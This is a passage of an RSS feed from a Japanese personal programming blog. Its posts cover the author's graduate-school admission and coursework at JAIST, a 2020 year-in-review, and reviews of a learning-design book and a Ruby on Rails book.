&lt;p class="footnote">&lt;a href="#fn-96753e88" name="f-96753e88" class="footnote-number">*1&lt;/a>&lt;span class="footnote-delimiter">:&lt;/span>&lt;span class="footnote-text">一部のxlsxとかpptはmarcel 1.0.0でもそのままapplication/zipと区別してくれるかもしれません。&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%DE%A5%B8%A5%C3%A5%AF%A5%CA%A5%F3%A5%D0%A1%BC">マジックナンバー&lt;/a>にあまり詳しくないのでわかりませんが、特定の&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%DE%A5%B8%A5%C3%A5%AF%A5%CA%A5%F3%A5%D0%A1%BC">マジックナンバー&lt;/a>を持つxlsxとかpptも存在するかも&lt;/span>&lt;/p>
&lt;/div>
&lt;/body></description></item><item><title>JAISTに入学します</title><link>https://qwyng.dev/posts/2021/03/07/164200/</link><pubDate>Sun, 07 Mar 2021 16:42:00 +0900</pubDate><guid>https://qwyng.dev/posts/2021/03/07/164200/</guid><description>&lt;body>
&lt;p>面接試験でボコボコになりかなり落ち込んでましたが、なぜか受かってました。&lt;/p>
&lt;p>&lt;span itemscope itemtype="http://schema.org/Photograph">&lt;img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/sasa5740/20210307/20210307163633.jpg" alt="f:id:sasa5740:20210307163633j:plain" title="" class="hatena-fotolife" itemprop="image">&lt;/span>&lt;/p>
&lt;p>卒業できるように頑張るぞ 💪&lt;/p>
&lt;h2>面接試験でおきたこと&lt;/h2>
&lt;p>「〜〜ってご存知ですか？」&lt;/p>
&lt;p>僕&amp;gt; わかりません〜〜〜(ToT)&lt;/p>
&lt;p>「〜〜の原理を説明してください」&lt;/p>
&lt;p>僕&amp;gt; あれがこうしてこうなってなんやかんやあってこうなりました(ToT)&lt;/p>
&lt;p>「哲学が得意科目にはいってますけど&lt;a href="#f-713f1fa1" name="fn-713f1fa1" title="大学のゼミが哲学だったので書いた、何もわかっていません">*1&lt;/a>計算機にとって”正しさ”とはなんですか？」&lt;/p>
&lt;p>僕&amp;gt; （死）&lt;/p>
&lt;p>研究テーマの質問に答えてくれた先生、面接資料みてくれた友人たち、本当にみなさんありがとうございました！！！！&lt;/p>
&lt;div class="footnote">
&lt;p class="footnote">&lt;a href="#fn-713f1fa1" name="f-713f1fa1" class="footnote-number">*1&lt;/a>&lt;span class="footnote-delimiter">:&lt;/span>&lt;span class="footnote-text">大学のゼミが哲学だったので書いた、何もわかっていません&lt;/span>&lt;/p>
&lt;/div>
&lt;/body></description></item><item><title>JAIST科目履修生を終えて</title><link>https://qwyng.dev/posts/2021/02/01/212621/</link><pubDate>Mon, 01 Feb 2021 21:26:00 +0900</pubDate><guid>https://qwyng.dev/posts/2021/02/01/212621/</guid><description>&lt;body>
&lt;p>9月から履修していた&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/JAIST">JAIST&lt;/a>のソフトウェア設計論が終了しました。&lt;/p>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fsasa5740.hatenablog.com%2Fentry%2F2020%2F09%2F02%2F001344" title="北陸先端科学技術大学院大学の科目履修生になりました - Tallman" class="embed-card embed-blogcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 190px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://sasa5740.hatenablog.com/entry/2020/09/02/001344">sasa5740.hatenablog.com&lt;/a>&lt;/cite>&lt;/p>
&lt;h1>単位とれたの&lt;/h1>
&lt;p>100点で優でした( ･´ｰ･｀)どや
&lt;span itemscope itemtype="http://schema.org/Photograph">&lt;img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/sasa5740/20210201/20210201205443.jpg" alt="f:id:sasa5740:20210201205443j:plain" title="" class="hatena-fotolife" itemprop="image">&lt;/span>&lt;/p>
&lt;p>実際は105/120なので全然パーフェクトじゃないんですが。
9月から新年まで毎週課題の嵐で正直大変でした...。難易度自体は仕事等である程度&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Java">Java&lt;/a>使っていれば優とれると思います。僕は使ったことないんですけどね。&lt;/p>
&lt;h1>どんな内容だったの&lt;/h1>
&lt;p>ソフトウェア設計論というと意味が広そうですが、主に２つの観点から講義が行われました。&lt;/p>
&lt;ol>
&lt;li>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Java">Java&lt;/a>を用いたOODM。&lt;/li>
&lt;li>並列処理とモデル検査&lt;/li>
&lt;/ol>
&lt;h3>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Java">Java&lt;/a>を用いたOODM&lt;/h3>
&lt;p>講義前半では、Object-oriented design methodologiesの略としてOODMという言葉が用いたソフトウェアの設計のお話でした。OODのことだと思います。&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/UML">UML&lt;/a>を使って&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%E6%A1%BC%A5%B9%A5%B1%A1%BC%A5%B9">ユースケース&lt;/a>図、シーケンス図、関連データモデルをバリバリ書いてました。最終的にVMor&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%EB">コンパイル&lt;/a>で動く簡易&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D7%A5%ED%A5%B0%A5%E9%A5%DF%A5%F3%A5%B0%B8%C0%B8%EC">プログラミング言語&lt;/a>を作成するのですが、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/VM">VM&lt;/a>とか&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%EB">コンパイル&lt;/a>の原理とOODどちらも学べてお得感がありました。&lt;br>
講義の中で&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Java">Java&lt;/a>の&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%EB">コンパイル&lt;/a>時のメソッド&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B7%A5%B0%A5%CD%A5%C1%A5%E3">シグネチャ&lt;/a>ーの決定と実行時のメソッド探索の話がありました。静的型付け言語のメソッド探索を調べたことはなかったのでいい知見が得れました。&lt;/p>
&lt;h3>並列処理とモデル検査&lt;/h3>
&lt;p>講義後半ではサンプルコードに&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Java">Java&lt;/a>を使った非同期処理のお話でした。レースコンディションや&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C7%A5%C3%A5%C9%A5%ED%A5%C3%A5%AF">デッドロック&lt;/a>、ライブロックの話から始まり、生産者/&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%BE%C3%C8%F1%BC%D4%CC%E4%C2%EA">消費者問題&lt;/a>と食事する哲学者問題を実際のコードを使ってなぜうまくいかないのか？を順を追って説明してくれました。解決策も課題で提出することになるのでかなり勉強になりました。&lt;br>
並列処理と合わせてモデル検査の話もありました。ソフトウェアの観点からいうとモデル検査とは、プログラム実行時の組み合わせを網羅的に探索して人間が自動テストを書くのでは気づけないパターンの問題（並列処理の&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C7%A5%C3%A5%C9%A5%ED%A5%C3%A5%AF">デッドロック&lt;/a>とか）を検知できるというものです。&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Java">Java&lt;/a>のモデル検査ツールである&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Java">Java&lt;/a> Path Finderを使って先の生産者/&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%BE%C3%C8%F1%BC%D4%CC%E4%C2%EA">消費者問題&lt;/a>と食事する哲学者のコードを検査して&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C7%A5%C3%A5%C9%A5%ED%A5%C3%A5%AF">デッドロック&lt;/a>するスケジューリングを発見、解消するという行為が楽しめました。&lt;/p>
&lt;h1>まとめ&lt;/h1>
&lt;p>全体として満足度高い講義でした！&lt;br>
ソフトウェア設計というテーマの中に知識がたくさん詰め込まれた講義が毎週きけて、質問もできて、毎回の課題を採点してくれて、いたれりつくせりでした。&lt;br>
学校で興味あることを学ぶって楽しいですね。&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/JAIST">JAIST&lt;/a>に入学を考えている方は一度科目履修生として講義を体験してみるのはどうでしょうか。自信を持ってオススメできます。&lt;/p>
&lt;/body></description></item><item><title>2020年を振り返る</title><link>https://qwyng.dev/posts/2020/12/31/233611/</link><pubDate>Thu, 31 Dec 2020 23:36:00 +0900</pubDate><guid>https://qwyng.dev/posts/2020/12/31/233611/</guid><description>&lt;body>
&lt;p>2019年の振り返りはこちら&lt;/p>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fsasa5740.hatenablog.com%2Fentry%2F2019%2F12%2F30%2F213408" title="2019年を振り返る - Tallman" class="embed-card embed-blogcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 190px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://sasa5740.hatenablog.com/entry/2019/12/30/213408">sasa5740.hatenablog.com&lt;/a>&lt;/cite>&lt;/p>
&lt;p>にかいめのふりかえり&lt;/p>
&lt;h2>1月&lt;/h2>
&lt;p>&lt;a href="https://sasa5740.hatenablog.com/archive/2020/1">2020-01-01から1ヶ月間の記事一覧 - Tallman&lt;/a>&lt;/p>
&lt;p>Rustやりたみが増してたので書いていた。実はこの時いろいろあって大学院への願書がだせなかったりで結構落ち込んでいた&lt;/p>
&lt;h2>2月&lt;/h2>
&lt;p>&lt;a href="https://sasa5740.hatenablog.com/archive/2020/2">2020-02-01から1ヶ月間の記事一覧 - Tallman&lt;/a>&lt;/p>
&lt;p>仕事でgraphql-&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/ruby">ruby&lt;/a>を使っていて直したいところが出てきたのでコントリビュートした。&lt;br>
このことも含めてそろそろ社外でなにか発表したいと思ってGinza.rbでLTもした。皆さん優しくて楽しかったおもひで。思えばこれがリアルで社外のエンジニアの人とであう最後の機会でした。&lt;br>
あとこのブログで一番読まれている沼の記事。僕はこれでコロナ期間中に10kg痩せたので皆さんも是非やって見てください。夏は腐るのでやめた方がいいです。&lt;/p>
&lt;p>後はAtocderのために&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B9%A5%AF%A5%EA%A5%D7%A5%C8">スクリプト&lt;/a>を書いてGemとして公開した。&lt;/p>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fqiita.com%2FQWYNG%2Fitems%2F0e2e6b72bd1969d0d751" title="RubyでAtcoderからテストを自動生成するライブラリを作りました - Qiita" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://qiita.com/QWYNG/items/0e2e6b72bd1969d0d751">qiita.com&lt;/a>&lt;/cite>&lt;/p>
&lt;p>これは2020年に書いたコードの中で多分一番人の役に立っている気がする。結構スターも来たし実際にforkして自分で改造して使ってくれている人もいて嬉しかった。自分で使用していても結構便利なのでもし&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>で&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Atcoder">Atcoder&lt;/a>に出ているという人がいたら是非使ってください。issueとかもお待ちしてます。&lt;/p>
&lt;h2>3月&lt;/h2>
&lt;p>&lt;a href="https://sasa5740.hatenablog.com/archive/2020/3">2020-03-01から1ヶ月間の記事一覧 - Tallman&lt;/a>&lt;/p>
&lt;p>なんかゲームの記事書いてた...。&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/LOL">LOL&lt;/a>でダイアになるのは4年くらいかかっているので許してください。&lt;br>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/N%CD%BD%C8%F7%B9%BB">N予備校&lt;/a>の&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Scala">Scala&lt;/a>のコースはかなり体験がよくて&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B8%A5%A7%A5%CD%A5%EA%A5%AF%A5%B9">ジェネリクス&lt;/a>とか型パラメーターとか位相とか&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>だけやっているとあまり考えない概念もしれて良かった。プログラミングちゃんとやりたいぜって人にはかなりおすすめできる。&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/UNIX">UNIX&lt;/a>哲学も短いながら普段お世話になっているOSの原点（？）の設計思想が学べて良かった。&lt;/p>
&lt;h2>4月&lt;/h2>
&lt;p>&lt;a href="https://sasa5740.hatenablog.com/archive/2020/4">2020-04-01から1ヶ月間の記事一覧 - Tallman&lt;/a>&lt;/p>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Scala">Scala&lt;/a>が結構面白かったので&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Scala">Scala&lt;/a>の記事、それとTypeScriptでブログ作った記事がありますね。ちなみにブログは放置してます...。&lt;br>
仕事でBatchLoaderというGemを見つけたのですがかなりキレイな実装で感心したのは今でも覚えてます。&lt;/p>
&lt;h2>5月&lt;/h2>
&lt;p>&lt;a href="https://sasa5740.hatenablog.com/archive/2020/5">2020-05-01から1ヶ月間の記事一覧 - Tallman&lt;/a>&lt;/p>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Atcoder">Atcoder&lt;/a>やってた。といっても茶色になんとかなったくらいのレベル。自分で&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B9%A5%AF%A5%EA%A5%D7%A5%C8">スクリプト&lt;/a>とか書く割にはレートは低い....。やっぱり数学の素養がなさすぎるなぁと考えていた気がする。&lt;/p>
&lt;h2>６月&lt;/h2>
&lt;p>&lt;a href="https://sasa5740.hatenablog.com/archive/2020/6">2020-06-01から1ヶ月間の記事一覧 - Tallman&lt;/a>&lt;/p>
&lt;p>社内でクリーン&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A1%BC%A5%AD%A5%C6%A5%AF%A5%C1%A5%E3">アーキテクチャ&lt;/a>の読書会をやってテンションあがった書いた記事がある。クリーン&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A1%BC%A5%AD%A5%C6%A5%AF%A5%C1%A5%E3">アーキテクチャ&lt;/a>はクリーン&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A1%BC%A5%AD%A5%C6%A5%AF%A5%C1%A5%E3">アーキテクチャ&lt;/a>という実装があるのではなく、抽象に依存せよ、とか依存の方向性を考えろ、とかソフトウェア設計に置ける鉄則を書にした本のように感じた。&lt;br>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Atcoder">Atcoder&lt;/a>含めて少し&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0">アルゴリズム&lt;/a>を使ったなにかが書きたくなったのでRustでBM法で全文探索を使ったstash検索ツールを書いた。これも結構便利で仕事でたまに使っている。この時あたりから型を含んだ&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/IDE">IDE&lt;/a>での開発体験が良すぎて仕事でも型を使いたくなってきていた。&lt;/p>
&lt;h2>7月&lt;/h2>
&lt;p>&lt;a href="https://sasa5740.hatenablog.com/archive/2020/7">2020-07-01から1ヶ月間の記事一覧 - Tallman&lt;/a>&lt;/p>
&lt;p>先月に書いたRustのツールを&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/brew">brew&lt;/a>に公開するためにいろいろやっていた。後&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/AWS">AWS&lt;/a>による&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%AF%A5%E9%A5%A6%A5%C9">クラウド&lt;/a>入門は
なぜ&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%AF%A5%E9%A5%A6%A5%C9">クラウド&lt;/a>なのか？なぜサーバーレスなのか？がちゃんと学べて良かった。&lt;/p>
&lt;h2>8月&lt;/h2>
&lt;p>&lt;a href="https://sasa5740.hatenablog.com/archive/2020/8">2020-08-01から1ヶ月間の記事一覧 - Tallman&lt;/a>&lt;/p>
&lt;p>増補改訂版パ&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Rails">Rails&lt;/a>良かったのでみんな買おう！&lt;/p>
&lt;h2>9月&lt;/h2>
&lt;p>&lt;a href="https://sasa5740.hatenablog.com/archive/2020/9">2020-09-01から1ヶ月間の記事一覧 - Tallman&lt;/a>&lt;/p>
&lt;p>去年の振り返りでも書いたが大学院にいきたいと思っているので科目履修生になった。&lt;br>
仕事で良いプロダクトを作るってどういうことなんだろう？？と悩んでいたので事業の&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C9%A5%E1%A5%A4%A5%F3">ドメイン&lt;/a>に関する本も読んでいた。お仕事では教育についてやっているんだけど僕は（自分がそうなんだけど）能力もやる気もない人間がどうやって一人前になるのかが興味があるので、他人を気持ちよく学ばせる仕組みというのは興味がある。ブログには書いてないが会社のnotionとかにも教育&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C9%A5%E1%A5%A4%A5%F3">ドメイン&lt;/a>周りの書籍の感想文を投稿したりしていた。&lt;/p>
&lt;h2>10 ~12 月&lt;/h2>
&lt;p>えー言い訳はできないのですが9月に入った大学院の課題がほぼ毎週あってそれにかまけていました。
あんまり残業もないリモートワークの独身一人暮らし男性ですらこんな大変なのに&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/JAIST">JAIST&lt;/a>の人たちは本当にSUGOI。テスト60点+提出物60点の講義だったんだけど提出物は58点でした。テストもとりあえず提出はしているので落単ということは流石にないと思う。あと授業自体は本当に面白くて、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Java">Java&lt;/a>のメソッドディスパッチの仕組み、非同期処理のモデル検査、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Java">Java&lt;/a>を用いて簡易&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/VM">VM&lt;/a>と&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%B9%BD%CA%B8%B2%F2%C0%CF">構文解析&lt;/a>を実装して&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D7%A5%ED%A5%B0%A5%E9%A5%DF%A5%F3%A5%B0%B8%C0%B8%EC">プログラミング言語&lt;/a>作成、色々盛りだくさんな講義だった。&lt;/p>
&lt;p>あと12月は私生活でメンタルが崩壊してた。&lt;/p>
&lt;h2>2021年&lt;/h2>
&lt;p>今年の仕事は人生初の新規プロダクトの開発でいろいろ大変だったけど充実してた気がする。チームの人が基本いい人過ぎて涙がちょちょぎれます。来年もバリューを発揮しつつ今度こそ科目履修生からステップアウトするぞ。&lt;/p>
&lt;/body></description></item><item><title>Design for How People learnを読んだ</title><link>https://qwyng.dev/posts/2020/09/23/230906/</link><pubDate>Wed, 23 Sep 2020 23:09:00 +0900</pubDate><guid>https://qwyng.dev/posts/2020/09/23/230906/</guid><description>&lt;body>
&lt;p>米アマゾンでe-learningで検索すると一番上にでてくるこの本が気になっていたので読みました。業務との関連もあったので一度読んでおきたかった本です。&lt;/p>
&lt;p>&lt;/p>
&lt;div class="hatena-asin-detail">
&lt;a href="https://www.amazon.co.jp/exec/obidos/ASIN/B018OJP5QW/hatena-blog-22/">&lt;img src="https://m.media-amazon.com/images/I/51M0cX78XnL._SL160_.jpg" class="hatena-asin-detail-image" alt="Design for How People Learn (Voices That Matter) (English Edition)" title="Design for How People Learn (Voices That Matter) (English Edition)">&lt;/a>&lt;div class="hatena-asin-detail-info">
&lt;p class="hatena-asin-detail-title">&lt;a href="https://www.amazon.co.jp/exec/obidos/ASIN/B018OJP5QW/hatena-blog-22/">Design for How People Learn (Voices That Matter) (English Edition)&lt;/a>&lt;/p>
&lt;ul>
&lt;li>
&lt;span class="hatena-asin-detail-label">作者:&lt;/span>&lt;a href="http://d.hatena.ne.jp/keyword/Julie%2C%20Dirksen" class="keyword">Julie, Dirksen&lt;/a>
&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">発売日:&lt;/span> 2015/11/28&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">メディア:&lt;/span> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Kindle">Kindle&lt;/a>版&lt;/li>
&lt;/ul>
&lt;/div>
&lt;div class="hatena-asin-detail-foot">&lt;/div>
&lt;/div>
&lt;p>正しいことを教えただけでは人はスキルを獲得することはできないという前提のもとにどうしたら受講者の学習体験をよくできるかを豊富な例示とともに解説してある本です。
例示が豊富でイラストも多くかなりわかりやすい本になっていると思います。この本自体もDesign for How People learnを取り入れてますね。&lt;br>
面白かった所をいくつか上げてきます。&lt;/p>
&lt;h2>誰だって自分はバカとは感じたくない&lt;/h2>
&lt;p>本ではモチベーションに対する言及の中で誰も自分をバカとは思いたくないので、知っている事が全くない書籍よりも自分が知っている事が多少ある本の方が人は手に取るということが書かれていました。ゲームと同様に以下に人に「自分は賢い！」と思ってもらうかどうかが大事であるとのことです。
これは自分の中では結構納得していて、だいたい自分がハマったゲームは最初のプレイで結構うまいじゃん！とシステムや他人に褒められたことがあるゲームが多い気がします。&lt;br>
情報全てを相手に伝えるのが正しいわけではないというのも同意です。「正しくいうのであれば〇〇にはこういうケースがあり～～」等ってゲームを初心者に教えるときによく聞くワードですけどそんなに情報詰め込んでも聞いてる側はアップアップになってしまうのでは？という気がします。&lt;/p>
&lt;h2>すぐに役立つものに人は興味をもつ&lt;/h2>
&lt;p>人間の理性的な部分にだけ問いかけているだけでは十分ではなく、本能的な部分に問いかけないと人は興味をもたないという話。
楽しいものと結びつけるというよりは学習者が今まさに欲しているものに対して知識を教えるのがコツとのことです。人間すぐ手に入る報酬を大切にするだろうし、穴がないのにスコップの使い方教わってもあまり興味をもてないって話ですね。&lt;/p>
&lt;h2>環境&lt;/h2>
&lt;p>学習は教室や研修室だけで起きるものではなく、良いコミニュ&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C6%A5%A3%A1%BC">ティー&lt;/a>や仲間たちに支えられていますとのこと。もしコミュニティができそうならば全力で支援して上げるべしとのこと。 コミュニティとかいっしょに学ぶ人って大きいですよね。自分もプログラミング学ぶときにはプログラミングスクールに通ったんですがその時いっしょに頑張っていた人がいたのがかなり学習のやる気に直結していたのを覚えています。
この環境を以下に平等に用意できるかがいわゆるEdTechのキモなんじゃないかと個人的に思っています。&lt;/p>
&lt;h2>対例を使う&lt;/h2>
&lt;p>いい例だけでなく悪い例を出すと理解しやすいよという話。問題のある書き方を見せたほうが正しい理解になるのはなるほどという感じです。
これもゲームでもコードでもよく聞く話ですね。よくうまいプレイヤーの動画を見て学習したり、いい設計の方法なんかの情報がありますが、私的にはだめなコードやプレイにたくさん指摘がある情報の方が役にたつ情報だと思います。いいコードとかいいプレイって割と状況によって変わってくることが多いんですが、悪いコードやプレイって割と共通していて役に立てやすいことが多いです。&lt;/p>
&lt;h2>あとがき&lt;/h2>
&lt;p>自分は&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/kindle">kindle&lt;/a> cloud readerとDeepL使って翻訳しなが読みましたが、最初に書いた通り割と平易な英文が多いですし図も豊富なので翻訳使わなくても読める人は多いと思います。&lt;br>
本文でも書いたのですが、ゲームにつながる話が多かったのかなと。他人に楽しくなにかを学習させるっていうのはゲームも教育もいっしょですね。&lt;/p>
&lt;/body></description></item><item><title>北陸先端科学技術大学院大学の科目履修生になりました</title><link>https://qwyng.dev/posts/2020/09/02/001344/</link><pubDate>Wed, 02 Sep 2020 00:13:00 +0900</pubDate><guid>https://qwyng.dev/posts/2020/09/02/001344/</guid><description>&lt;body>
&lt;p>タイトルの通り&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%CB%CC%CE%A6%C0%E8%C3%BC%B2%CA%B3%D8%B5%BB%BD%D1%C2%E7%B3%D8%B1%A1%C2%E7%B3%D8">北陸先端科学技術大学院大学&lt;/a>のソフトウェア設計論という講義の科目履修生になりました。
もともと情報系の学位がほしかったのと、課題を与えられる環境のありがたさを痛感しているので社会人大学院の門は叩きたいと思っていました。先立って体験しようと考えての科目履修です。&lt;br>
科目履修生というのは講義単位で選択して大学に入学することができる制度です。費用は入学金3万円、1講義大体3万円ほど。その他に検定料も1万円かかりました。&lt;br>
8月30日から授業は始まっていて、いきなり2時間の授業が2連続で始まって驚きました。学部は文系だったのですが、理系ってこれが当たり前なの？ってくらい課題があったので面食らっています。早速社会人大学院の大変さを感じているところです。 先生も「社会人で仕事をしながらこの課題は大変だと思いますが、私の方からは頑張ってとしか申せません！頑張ってください」と言っていて笑いました。&lt;br>
講義の内容は&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%AA%A5%D6%A5%B8%A5%A7%A5%AF%A5%C8%BB%D8%B8%FE">オブジェクト指向&lt;/a>周りをより学術的な目線で解説していくようなものでした。プログラミング自体は素人ではないので&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%C8%A5%EA%A5%D3%A5%E5%A1%BC%A5%C8">アトリビュート&lt;/a>やらインターフェースが初耳ということはないのですが、これをプログラミング知らない人が受けてると思うと恐ろしいスピードで授業が進んでいるように思います。このスピードで数学色の強い講義についていけるかはかなり不安です。&lt;br>
講義資料はすべて英語で、ある程度OSの操作に習熟してないと予習等もままならなそうな雰囲気はあります。&lt;br>
昨日人生で初めての大学院の課題を提出したのですが、無事先生から満点をもらいました。満点といっても2点中2点ですけどね。 &lt;br>
質問をすれば必ず返ってきますし、提出した課題は採点してもらえますし、本当に勉強をするためだけの場所に来たんだなという感じでワクワクしております。無事12月には単位取得して来年には入学したいと思っています。頑張ろう。&lt;/p>
&lt;/body></description></item><item><title>増補改訂版 パーフェクト Ruby on Rails の感想</title><link>https://qwyng.dev/posts/2020/08/15/144726/</link><pubDate>Sat, 15 Aug 2020 14:47:00 +0900</pubDate><guid>https://qwyng.dev/posts/2020/08/15/144726/</guid><description>&lt;body>
&lt;p>みんな読んでるパーフェクト &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby%20on%20Rails">Ruby on Rails&lt;/a>を読みました。&lt;/p>
&lt;p>&lt;/p>
&lt;div class="hatena-asin-detail">
&lt;a href="https://www.amazon.co.jp/exec/obidos/ASIN/4297114623/hatena-blog-22/">&lt;img src="https://m.media-amazon.com/images/I/51vXziYiNZL._SL160_.jpg" class="hatena-asin-detail-image" alt="パーフェクト Ruby on Rails 【増補改訂版】 (Perfect series)" title="パーフェクト Ruby on Rails 【増補改訂版】 (Perfect series)">&lt;/a>&lt;div class="hatena-asin-detail-info">
&lt;p class="hatena-asin-detail-title">&lt;a href="https://www.amazon.co.jp/exec/obidos/ASIN/4297114623/hatena-blog-22/">パーフェクト Ruby on Rails 【増補改訂版】 (Perfect series)&lt;/a>&lt;/p>
&lt;ul>
&lt;li>
&lt;span class="hatena-asin-detail-label">作者:&lt;/span>&lt;a href="http://d.hatena.ne.jp/keyword/%A4%B9%A4%AC%A4%EF%A4%E9%A4%DE%A4%B5%A4%CE%A4%EA" class="keyword">すがわらまさのり&lt;/a>,&lt;a href="http://d.hatena.ne.jp/keyword/%C1%B0%C5%E7%BF%BF%B0%EC" class="keyword">前島真一&lt;/a>,&lt;a href="http://d.hatena.ne.jp/keyword/%B6%B6%CE%A9%CD%A7%B9%A8" class="keyword">橋立友宏&lt;/a>,&lt;a href="http://d.hatena.ne.jp/keyword/%B8%DE%BD%BD%CD%F2%CB%AE%CC%C0" class="keyword">五十嵐邦明&lt;/a>,&lt;a href="http://d.hatena.ne.jp/keyword/%B8%E5%C6%A3%CD%A5%B0%EC" class="keyword">後藤優一&lt;/a>
&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">発売日:&lt;/span> 2020/07/25&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">メディア:&lt;/span> 単行本（ソフトカバー）&lt;/li>
&lt;/ul>
&lt;/div>
&lt;div class="hatena-asin-detail-foot">&lt;/div>
&lt;/div>
&lt;p>9章くらいまでは流し読みです。以下個人的に面白かったところを書きます。&lt;/p>
&lt;h2>10章 コンテナを利用した&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Rails">Rails&lt;/a>アプリケーション&lt;/h2>
&lt;p>Gemfileのimageレイヤのキャッシュのところ参考になりました。この方法なら多少imageのレイヤーは増えるものの、本体コードに変更があってもGemfileに変更がない時にimage build中にbundle installしなくてすみますね。&lt;a href="#f-3bcf721f" name="fn-3bcf721f" title="ドキュメントのこの節で詳しい挙動がのっていました [https://docs.docker.jp/develop/develop-images/dockerfile_best-practices.html#leverage-build-cache:title]
">*1&lt;/a>&lt;/p>
&lt;h2>11章 複雑な&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C9%A5%E1%A5%A4%A5%F3">ドメイン&lt;/a>を表現する&lt;/h2>
&lt;h3>値オブジェクト&lt;/h3>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Rails">Rails&lt;/a>での値オブジェクトの具体的な活用例がのっていました。&lt;code>composed_of&lt;/code>を業務で使ったことはないのですが、ファットモデルでもう限界だってなってから使ったほうが良さそうな手法だと思いました。&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Rails">Rails&lt;/a>開発だとできるだけ要件削って値オブジェクトにロジックがそれほどないくらいにシンプルにしたほうが良い気がします。
